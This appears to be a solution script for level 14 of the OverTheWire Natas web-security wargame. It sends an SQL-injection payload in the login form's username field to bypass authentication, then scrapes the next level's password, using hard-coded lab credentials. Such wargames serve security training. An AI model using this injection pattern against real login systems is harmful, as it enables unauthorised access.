import requests
import re

username = 'natas14'
password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'

url = f'http://{username}.natas.labs.overthewire.org?debug=true'

data = { 'username' : '" OR true#', 'password' : 'pass'}

response = requests.post(url, auth = (username, password), data = data)
content = response.text

print(re.findall('The password for natas15 is (.*)<br>', content)[0])